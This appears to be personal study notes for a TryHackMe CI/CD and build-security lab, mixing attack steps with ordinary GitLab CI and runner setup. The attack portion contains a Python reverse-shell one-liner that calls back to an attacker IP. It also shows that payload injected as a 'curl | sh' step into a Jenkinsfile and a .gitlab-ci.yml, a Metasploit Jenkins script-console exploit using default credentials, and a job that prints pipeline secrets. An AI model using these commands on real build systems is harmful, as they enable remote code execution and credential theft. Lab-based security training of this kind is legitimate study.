############
### cicd ###
############
## links
# https://tryhackme.com/r/room/cicdandbuildsecurity


## enumerate public repo
python gitlab-enum.py -u "http://gitlab.tryhackme.loc/" -t "glpat-s3zKVsKoh21fmCDGU-CJ"


## ci files update
$ cat shell.sh 
/usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.50.75.33",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
$ python3 -m http.server 9090
$ nc -nlvp 9091

# edit Jenkinsfile and wait pipeline to build
pipeline {
    agent any
    stages {
       stage('build') {
          steps {
              sh '''
                    curl http://10.50.75.33:9090/shell.sh | sh
                '''                 
              }             
          }
       }       
    }

# edit .gitlab-ci.yml 
stage: deploy
script:
  - 'echo "Starting translator engine.... Please stand by...."'
  - 'curl http://10.50.75.33:9090/shell.sh | sh'
  - python3 translator.py
environment:
  name: ${CI_JOB_NAME}


## attack build server
default password:	jenkins / jenkins

msfconsole
use exploit/multi/http/jenkins_script_console
show options
set target 1
set payload linux/x64/meterpreter/bind_tcp
set password jenkins
set username jenkins
set RHOST jenkins.tryhackme.loc
set targeturi /
set rport 8080
run


## attack build pipeline
# Edit .gitlab-ci.yml
# Create merge request
# Auto validate MR
# Merge into main
# Deploy is now auto exec


## attack build environment
# compare PROD runner and DEV runner, it should be different
# if the same, exploit runner to be able to access DEV and PROD


## leak secret var
# check var from PROD deployment and try to use it
my_job:
  script:
    - echo "$MY_SECRET_KEY" # This will expose the secret
    - echo "masked: $CI_JOB_TOKEN" # This will mask the secret


## .gitlab-ci.yml
# Stages
build-job:
  stage: build
  script:
    - echo "Hello, $GITLAB_USER_LOGIN!"

# Tests
test-job1:
  stage: test
  script:
    - echo "This job tests something"

test-job2:
  stage: test
  script:
    - echo "This job tests something, but takes more time than test-job1."
    - echo "After the echo commands complete, it runs the sleep command for 20 seconds"
    - echo "which simulates a test that runs 20 seconds longer than test-job1"
    - sleep 20

# Deployment
deploy-prod:
  stage: deploy
  script:
    - echo "This job deploys something from the $CI_COMMIT_BRANCH branch."
    - echo "Making the website directory"
    - mkdir -p /tmp/time/cicd
    - echo "Copying the website files"
    - cp website_src/* /tmp/time/cicd/
    - echo "Hosting website using a screen"
    - screen -d -m php -S 127.0.0.1:8081 -t /tmp/time/cicd/ &    
    - echo "Deployment complete! Navigate to http://localhost:8081/ to test!"
  environment: production


## Runners
# use Runners to execute tasks in project

# Download the binary for your system
sudo curl -L --output /usr/local/bin/gitlab-runner https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-linux-amd64
sudo chmod +x /usr/local/bin/gitlab-runner
sudo useradd --comment 'GitLab Runner' --create-home gitlab-runner --shell /bin/bash
sudo gitlab-runner install --user=gitlab-runner --working-directory=/home/gitlab-runner
sudo gitlab-runner start

# Command to register runner
sudo gitlab-runner register --url http://gitlab.tryhackme.loc/ --registration-token GR1348941Q4MoebK5DgYqrEzSD5V-
	executor == shell
# checkbox: run untagged jobs
















